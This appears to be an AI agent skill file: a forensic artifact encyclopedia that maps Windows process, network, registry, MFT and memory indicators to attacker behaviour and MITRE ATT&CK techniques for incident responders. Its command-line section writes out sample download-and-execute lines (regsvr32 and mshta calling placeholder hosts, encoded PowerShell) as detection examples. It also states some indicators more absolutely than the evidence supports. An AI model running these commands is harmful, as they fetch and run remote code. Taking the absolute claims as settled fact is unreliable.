---
name: forensic-artifacts
description: "Forensic artifact interpretation encyclopedia — maps raw tool output to meaning, attacker behavior, and MITRE ATT&CK techniques. Answers 'WHAT does this mean?' not 'HOW do I run the tool?'"
version: 1.0.0
category: forensics
---

# Forensic Artifacts Encyclopedia

Maps common forensic artifacts to interpretation, attacker behavior, and MITRE ATT&CK techniques. Load this skill when you have raw tool output and need to understand WHAT it means — process anomalies, network indicators, registry persistence, filesystem tampering.

## How to Use

1. Identify the artifact type (Process, Network, Registry, Filesystem, MFT, Memory)
2. Jump to the corresponding section below
3. Match the observed artifact against the "What You See" column
4. Read the interpretation and ATT&CK mapping
5. Cross-reference with `forensics-agent` skill for investigation phases, tool commands, and finding pipeline

---

## Process Artifacts

### ImagePath Mismatch

**What You See**: Process name (`lsass.exe`) running from non-standard path (`C:\Windows\Temp\lsass.exe` instead of `C:\Windows\System32\lsass.exe`)

**Interpretation**: Process masquerading. Attacker placed malware named after a legitimate system binary in a writable directory to evade process-list inspection.

**MITRE ATT&CK**: T1036.005 (Masquerading: Match Legitimate Name or Location)

**Confidence**: HIGH if path is writable by user; MEDIUM if system-owned alternate path

**Next Step**: Check parent process — if parent is not `wininit.exe`, confidence increases. Compare file hash against known-good.

---

### Typo-Squatted Process Name

**What You See**: Process name that is one character off from a legitimate system binary: `epxlorer.exe` (vs `explorer.exe`), `svhost.exe` (vs `svchost.exe`), `lsasss.exe` (vs `lsass.exe`), `winlog0n.exe` (vs `winlogon.exe`); or character substitution (`l`→`1`, `o`→`0`, `s`→`5`)

**Interpretation**: Name-based process masquerading. Attacker named malware to resemble a legitimate process so it blends into Task Manager and process lists. Single-character substitution exploits how humans read — at a glance, `epxlorer.exe` looks like `explorer.exe`. More subtle than path-based masquerading because the name IS the deception, not just the location.

**MITRE ATT&CK**: T1036.005 (Masquerading: Match Legitimate Name or Location)

**Confidence**: HIGH for single-char substitution of a well-known system process name; HIGH if binary path is user-writable (Downloads, Temp, AppData); MEDIUM if binary is in System32 with a suspicious name (requires hash verification — could be a renamed system binary)

**Next Step**: Cross-reference with filescan to get the full binary path. Check parent process — a user process spawning something named like a system binary is suspicious. Compare binary hash against the legitimate system binary's hash. Check digital signature — Microsoft signs all system binaries; any typo-squatted binary will be unsigned.

---

### 32-bit Binary on 64-bit OS (Wow64 Process)

**What You See**: Process has `Wow64=True` in volatility3 pslist output (or Image Type = x86 on 64-bit Windows)

**Interpretation**: Process is a 32-bit executable running via Windows-on-Windows 64 (WoW64) subsystem on a 64-bit OS. While many legitimate applications ship 32-bit (Microsoft Office, older tools), modern malware frequently uses 32-bit payloads for maximum compatibility across targets. When a 32-bit process also has other suspicious indicators (typo-squatted name, user-writable path, unusual parent), the Wow64 flag adds weight.

**MITRE ATT&CK**: N/A (compatibility indicator, not a technique — but correlates with commodity malware and droppers)

**Confidence**: LOW as a standalone indicator; MEDIUM when combined with typo-squatted name or suspicious path

**Next Step**: Note in finding metadata. Alone it means nothing — but combined with name/path/parent anomalies, it strengthens the case for malicious intent.

---

### Suspicious Parent-Child

**What You See**: `cmd.exe` spawned by `winword.exe` or `excel.exe`; `powershell.exe` spawned by `w3wp.exe` (IIS worker); `svchost.exe` with no parent

**Interpretation**: Office macro execution spawning shell → weaponized document. IIS spawning PowerShell → web shell. Orphaned svchost → process injection or parent killed.

**MITRE ATT&CK**: T1566.001 (Phishing: Spearphishing Attachment), T1059.001 (Command and Scripting: PowerShell), T1055 (Process Injection)

**Confidence**: HIGH for Office→shell chain; MEDIUM for web server→shell (consider legitimate admin scripts)

---

### Unsigned Process in System32

**What You See**: Executable in `System32` or `SysWOW64` without a valid digital signature from Microsoft

**Interpretation**: Malware planted in system directory to blend in. Legitimate Microsoft binaries are ALWAYS signed.

**MITRE ATT&CK**: T1036 (Masquerading)

**Confidence**: HIGH — Microsoft signs every binary in System32

---

### Process Hollowing Indicators

**What You See**: Process with `VadS` (shared memory) in VAD tree but different image on disk; `CreateProcess(SUSPENDED)` → `NtUnmapViewOfSection` → `VirtualAllocEx` → `SetThreadContext` → `ResumeThread` sequence

**Interpretation**: Process hollowing. Attacker starts legitimate process suspended, unmaps its code, injects malware, then resumes. The process appears legitimate in Task Manager but executes malicious code.

**MITRE ATT&CK**: T1055.012 (Process Injection: Process Hollowing)

**Confidence**: HIGH from VAD analysis; TENTATIVE from parent-child alone

---

### svchost.exe Running Outside services.exe

**What You See**: `svchost.exe` instance not parented by `services.exe` (PID ~500-700)

**Interpretation**: Malware masquerading as service host. Legitimate `svchost.exe` always has `services.exe` as parent.

**MITRE ATT&CK**: T1569.002 (System Services: Service Execution), T1036.005

**Confidence**: HIGH — this is a definitive indicator

---

### Suspicious Command-Line Arguments

**What You See**:
- `cmd.exe /c "..." | powershell -enc <base64>` → encoded PowerShell
- `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication "` → MSHTML execution
- `regsvr32.exe /s /u /i:http://<IP>/file.sct scrobj.dll` → remote COM scriptlet
- `mshta.exe http://<C2>/payload.hta` → HTA download cradle

**Interpretation**: Living-off-the-land execution. Attacker uses signed Microsoft binaries to execute malicious code, bypassing application whitelisting.

**MITRE ATT&CK**: T1218 (System Binary Proxy Execution), T1027 (Obfuscated Files), T1059.001

**Confidence**: HIGH for encoded base64; MEDIUM for complex but potentially legitimate args

---

### Injection via Thread Creation

**What You See**: `CreateRemoteThread` targeting a different process; thread start address in unbacked memory region

**Interpretation**: DLL injection or shellcode injection into a target process (typically `explorer.exe`, `svchost.exe`, or browser process).

**MITRE ATT&CK**: T1055.001 (DLL Injection), T1055 (Process Injection)

**Confidence**: HIGH if target is unexpected (e.g., `notepad.exe` receiving threads from `word.exe`)

---

## Network Artifacts

### Beaconing Pattern

**What You See**: Regular periodic connections to same external IP — every 30, 60, 300 seconds with consistent packet size

**Interpretation**: C2 beacon. Malware phoning home on a timer. The period and jitter profile can fingerprint the C2 framework (Cobalt Strike defaults to 60s with 0% jitter; Meterpreter uses 5s default; Empire varies).

**MITRE ATT&CK**: T1071.001 (Application Layer Protocol: Web Protocols), T1573 (Encrypted Channel)

**Confidence**: HIGH if period is regular and destination has no business purpose; MEDIUM if could be update check

**Next Step**: Check process responsible (`netscan` → PID → `pslist`). Extract destination IP, check against threat intel.

---

### Unusual Outbound Port

**What You See**: Outbound connections on ports 4444, 8080, 8443, 53 (non-DNS), 443 (non-TLS handshake)

**Interpretation**:
- 4444 → Metasploit/Meterpreter default
- 8080/8443 → common HTTP/S C2 alternatives
- Port 53 non-DNS traffic → DNS tunneling
- Port 443 without TLS handshake → raw TCP C2 through firewall-friendly port

**MITRE ATT&CK**: T1572 (Protocol Tunneling), T1043 (Commonly Used Port)

**Confidence**: MEDIUM — port alone is not conclusive; examine traffic content

---

### High-Volume Data Exfiltration

**What You See**: Large outbound transfer (100MB+) to single external IP over short period; or many small transfers totaling >1GB over hours

**Interpretation**: Data exfiltration. Attacker staging and extracting collected data. Small-chunk exfil with delays = exfil over C2 channel. Single large transfer = likely separate exfil mechanism.

**MITRE ATT&CK**: TA0010 (Exfiltration), T1041 (Exfiltration Over C2 Channel)

**Confidence**: HIGH if destination is unknown IP and transfer coincides with access period; LOW if could be cloud backup sync

---

### Lateral Movement: SMB to Multiple Hosts

**What You See**: Process connecting to port 445 on multiple internal IPs in rapid succession

**Interpretation**: Lateral movement probing. Attacker scanning for open SMB shares or attempting PsExec/wmic remote execution.

**MITRE ATT&CK**: T1021.002 (Remote Services: SMB/Windows Admin Shares), T1046 (Network Service Scanning)

**Confidence**: HIGH from single source process touching 5+ internal hosts

---

### DNS Anomalies

**What You See**: DNS queries for unusually long subdomains (`data.exfiltrated.here.attacker-c2.com`); TXT record queries; high-frequency queries to same domain

**Interpretation**: DNS tunneling or DNS-based C2. Long subdomains encode exfiltrated data. TXT queries carry commands.

**MITRE ATT&CK**: T1071.004 (Application Layer Protocol: DNS), T1048.001 (Exfiltration Over DNS)

**Confidence**: HIGH for subdomains >50 chars or containing base64-like patterns

---

## Registry Artifacts

### Persistence: Run Keys

**What You See**: Entries in `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, `HKCU\...\Run`, or `RunOnce` pointing to suspicious paths (`%APPDATA%`, `%TEMP%`, `C:\Users\Public\`)

**Interpretation**: Registry-based persistence. Malware will survive reboot because Windows auto-executes these keys at login.

**MITRE ATT&CK**: T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys)

**Confidence**: HIGH for paths in user-writable temp directories; MEDIUM for unusual binary names in legitimate paths

---

### Persistence: Services

**What You See**: New Windows service with `Start = 2` (auto-start), `ImagePath` pointing to suspicious path, or service name mimicking legitimate service (typo-squatting: `WinDefend` → `WinDefender`)

**Interpretation**: Service-based persistence. Service runs as SYSTEM on boot. Typo-squatting evades casual inspection.

**MITRE ATT&CK**: T1543.003 (Create or Modify System Process: Windows Service)

**Confidence**: HIGH for suspicious image paths; MEDIUM for typo-squat names (verify binary hash)

---

### Persistence: Scheduled Tasks

**What You See**: Scheduled task with trigger `AtLogon` or `Daily` executing from `%APPDATA%\malware.exe`; task named to blend in (`GoogleUpdateTaskMachineUA`, `OneDrive Standalone Update`)

**Interpretation**: Scheduled task persistence. Attacker uses common update task names to evade detection.

**MITRE ATT&CK**: T1053.005 (Scheduled Task/Job: Scheduled Task)

**Confidence**: HIGH if binary path is user-writable; MEDIUM if path is unusual for the task name

---

### User Activity: Typed URLs / Recent Files

**What You See**: `NTUSER.DAT\Software\Microsoft\Internet Explorer\TypedURLs`; `RecentDocs` key; Shellbags (`USRCLASS.DAT\...\ShellBags`) showing folders the user browsed

**Interpretation**: User activity profiling. Shows what the user typed, opened, and browsed. Not malicious on its own but establishes user behavior baseline.

**MITRE ATT&CK**: N/A (user activity, not attacker behavior — but can reveal attacker reconnaissance)

**Confidence**: HIGH for shellbags and typed URLs (hard to forge); MEDIUM for RecentDocs (can be cleared)

---

### RDP Connection History

**What You See**: `HKCU\Software\Microsoft\Terminal Server Client\Servers` with external IPs; Default `UserName` hint

**Interpretation**: Outbound RDP connections from this host. External IPs suggest attacker used this host as jump box for lateral RDP.

**MITRE ATT&CK**: T1021.001 (Remote Desktop Protocol)

**Confidence**: HIGH — RDP client caches destination hostnames/IPs automatically

---

## Filesystem Artifacts

### Alternate Data Streams (ADS)

**What You See**: NTFS ADS on file — `file.txt:hidden.exe` with executable content; ADS on directory

**Interpretation**: Data hiding. Attacker stored malware or data in ADS to evade directory listing (`dir` shows only primary stream). Common after dropper execution.

**MITRE ATT&CK**: T1564.004 (Hide Artifacts: NTFS File Attributes)

**Confidence**: HIGH — ADS with executable content has no legitimate use on modern Windows

---

### Timestomp (Timestamp Tampering)

**What You See**: `$STANDARD_INFORMATION` timestamps differ from `$FILE_NAME` timestamps in MFT; file created/modified/accessed timestamps all identical to the second; timestamps predate OS install date

**Interpretation**: Timestomping. Attacker altered file timestamps to blend with system files or to mislead timeline analysis. Identical timestamps = SetFileTime API used.

**MITRE ATT&CK**: T1070.006 (Indicator Removal: Timestomp)

**Confidence**: HIGH for SI/FN mismatch; MEDIUM for identical timestamps (some installers do this legitimately)

---

### Hidden Files in System Directories

**What You See**: Files with `ATTRIB +H` (hidden) or `+S` (system) attributes in `C:\Windows\Temp`, `C:\ProgramData`, `C:\Users\Public`; or files with names matching system files but in wrong directories

**Interpretation**: Attacker hiding tools and staged data. System+hidden attributes make files invisible to default Explorer view.

**MITRE ATT&CK**: T1564.001 (Hide Artifacts: Hidden Files and Directories)

**Confidence**: HIGH for executables in Temp with system attributes; LOW for log/config files

---

### Web Shell Indicators

**What You See**: `.asp`, `.aspx`, `.php` files in web root (`inetpub\wwwroot`) with recent timestamps; web server process (`w3wp.exe`) spawning `cmd.exe` or `powershell.exe`

**Interpretation**: Web shell deployed. Attacker uploaded script-based shell through vulnerable web app. File access + process creation chain confirms active use.

**MITRE ATT&CK**: T1505.003 (Server Software Component: Web Shell)

**Confidence**: HIGH for script file + process chain combination

---

### Prefetch Anomalies

**What You See**: Prefetch file for `CMD.EXE-<hash>.pf` or `POWERSHELL.EXE-<hash>.pf` with run count = 1; prefetch for binary executed from `%TEMP%`

**Interpretation**: First-time execution of shell from unusual location. Prefetch records every process execution with run count and last-run time. Single execution of `cmd.exe` from `TEMP` is highly suspicious.

**MITRE ATT&CK**: T1059 (Command and Scripting Interpreter)

**Confidence**: HIGH for shell binary from TEMP; MEDIUM for uncommon shell usage in general

---

### Browser Download Artifacts

**What You See**: Files with `.crdownload` extension in user profile directories; `Zone.Identifier` alternate data stream on downloaded executables; files in `Downloads` directory with `ZoneId=3` in their ADS

**Interpretation**: Browser-initiated download. `.crdownload` is Chromium's temporary file extension during active downloads — the file is renamed to its final name when complete. A persistent `.crdownload` suggests the download was interrupted or the browser crashed during transfer. The `Zone.Identifier:$DATA` ADS (visible with `dir /r` or sleuthkit `icat`) contains the download source URL and security zone — this proves the file arrived via browser download, not USB, network share, or pre-installation. ZoneId=3 means Internet Zone (untrusted source).

**MITRE ATT&CK**: T1566.001 (Phishing: Spearphishing Attachment), T1204.002 (User Execution: Malicious File)

**Confidence**: HIGH — `.crdownload` extension definitively proves browser download origin. Zone.Identifier ADS with ZoneId=3 proves the file came from the internet.

**Next Step**: Extract the Zone.Identifier stream to recover the download URL (host + path). Correlate the download timestamp with browser history (TypedURLs, download SQLite database). Check email security gateway logs for the same filename or URL. The `.crdownload` partial file may contain forensic artifacts even if incomplete — check its size and magic bytes.

**Example**: Finding F-niel-003 in a real case used `epxlorer.exe435568.crdownload` from filescan to prove the malware arrived via Microsoft Edge download, tying together the phishing email vector and the executed payload.

---

## MFT Artifacts

### SI/FN Timestamp Mismatch

**What You See**: `$STANDARD_INFORMATION` (SI) timestamp differs from `$FILE_NAME` (FN) timestamp by >1 hour; SI shows 2024 but FN shows 2023

**Interpretation**: Timestomp. `$STANDARD_INFORMATION` is user-modifiable via `SetFileTime` API. `$FILE_NAME` is kernel-maintained and only updated on file creation/move. The mismatch reveals the true creation window.

**MITRE ATT&CK**: T1070.006 (Indicator Removal: Timestomp)

**Confidence**: HIGH — SI/FN discrepancy >24h is almost certainly tampering

---

### $MFT Resident vs Non-Resident

**What You See**: Small file (<700 bytes) with data resident inside MFT record; MFT record shows `$DATA` attribute with `Resident` flag but file appears empty in Explorer

**Interpretation**: Data hidden in MFT slack. Attacker uses resident data attribute to store information inside the MFT itself, invisible to most forensic tools.

**MITRE ATT&CK**: T1564 (Hide Artifacts)

**Confidence**: MEDIUM — some legitimate tiny files are naturally resident; check content

---

### Deleted File Recovery Indicators

**What You See**: MFT record with `IN_USE` flag = 0 (free/available) but `$DATA` attribute still points to valid clusters; filename still readable

**Interpretation**: Recently deleted file. MFT record not yet reused. File content may still be recoverable if clusters haven't been overwritten.

**MITRE ATT&CK**: T1070.004 (Indicator Removal: File Deletion)

**Confidence**: Recovery confidence depends on time since deletion and disk activity

---

### UsnJrnl ($UsnJrnl:$J) Anomalies

**What You See**: High volume of USN_RECORD entries for single file (rename→delete→create→rename cycle); DELETE + CLOSE entries for security logs (`Security.evtx`)

**Interpretation**: File manipulation burst suggests anti-forensic activity. Security log deletion indicates attacker covering tracks. Rename cycles suggest file staging.

**MITRE ATT&CK**: T1070.001 (Indicator Removal: Clear Windows Event Logs), T1070.004

**Confidence**: HIGH for security log deletion; MEDIUM for rename cycles (installers do this legitimately)

---

## Memory Artifacts

### Injected Code Detection

**What You See**: Memory region with `PAGE_EXECUTE_READWRITE` (RWX) permissions; `VAD` tag not matching the backing file; `MZ` header at non-zero offset in a region

**Interpretation**: Code injection. RWX memory is required for dynamically-generated code. Unbacked executable memory with PE header = injected DLL or shellcode.

**MITRE ATT&CK**: T1055 (Process Injection)

**Confidence**: HIGH for RWX + unbacked + PE header combination

---

### Unlinked DLL

**What You See**: DLL loaded in process memory (`InLoadOrderModuleList` in PEB) but NOT listed in VAD tree; or vice versa

**Interpretation**: Hidden DLL. Attacker manually mapped DLL into process without using `LoadLibrary`, evading module-listing tools.

**MITRE ATT&CK**: T1055.001 (DLL Injection), T1574.002 (DLL Side-Loading)

**Confidence**: HIGH — legitimate software uses LoadLibrary which updates both lists

---

### Mutex Objects Indicating Malware

**What You See**: Named mutex matching known malware families: `Global\<rand_guid>`, `Local\SM0:<numbers>`, `MicrosoftUpdate` (Ursnif), `_AVIRA_2109` (Emotet)

**Interpretation**: Malware infection marker. Many families create named mutexes for single-instance enforcement. The mutex name can fingerprint the family.

**MITRE ATT&CK**: N/A (malware artifact, not technique — but identifies the tool used)

**Confidence**: HIGH if mutex matches known IOC; LOW if generic name

---

### Network Connections from Injected Process

**What You See**: `netscan` shows TCP connection from PID that also has injected memory regions (RWX, VAD anomaly)

**Interpretation**: Active C2 from injected process. The injection enabled network communication. PID on connection + memory analysis on same PID = correlated evidence.

**MITRE ATT&CK**: T1055 + T1071 (Injection + C2)

**Confidence**: HIGH — correlation of memory artifact with network artifact is strong evidence

---

## Cross-Reference: Finding → Next Steps

| Finding Type | Next Phase | Tool Source | Record As |
|---|---|---|---|
| Process anomaly | Phase 2: Deep-dive that PID | forensics-agent (volatility3, MemProcFS) | Finding with PID, path, parent PID |
| Typo-squatted name | Phase 2: Hash comparison, path check | forensics-agent (volatility3, MemProcFS exe/) | Finding + IOC (binary hash, path) |
| Network beacon | Phase 2: Trace to process, extract IOCs | forensics-agent (netscan, MemProcFS net/) | IOC (IP, domain, port) |
| Registry persistence | Phase 2: Trace binary, timeline entry | forensics-agent (RegRipper via sift-exec.sh) | Finding + IOC (registry key, binary hash) |
| Timestomp | Phase 2: File-system timeline | forensics-agent (sleuthkit, plaso via sift-exec.sh) | Finding + timeline event |
| Web shell | Phase 2: Log analysis, command timeline | forensics-agent (sleuthkit fls) | Finding + IOC (file path, hash) |
| Browser download | Phase 2: Extract Zone.Identifier, correlate email | forensics-agent (sleuthkit icat, volatility3 filescan) | Finding + IOC (download URL, sender domain) |
| Injected code | Phase 2: Extract and analyze payload | forensics-agent (volatility3 malfind, MemProcFS VAD) | Finding + IOC (mutex, C2 IP) |

## Pitfalls

1. **Artifact ≠ Malicious**: An unsigned binary in Temp folder could be a legitimate installer. Always correlate with parent process, network connections, and timeline context before calling it.
2. **SI/FN mismatch in virtualized apps**: Some application virtualization (App-V, ThinApp) legitimately touches timestamps. Confirm the mismatch aligns with attacker activity window.
3. **Memory-only artifacts are volatile**: Process injection evidence disappears on reboot. Capture memory dumps FIRST in any investigation sequence.
4. **Mutex names change between versions**: Rely on mutex patterns (guid-like, specific prefixes) rather than exact strings. Threat intel IOCs go stale within weeks.
5. **Don't over-index on port numbers**: Port 4444 has legitimate uses (Kubernetes, some databases). Always check the actual traffic or process context.
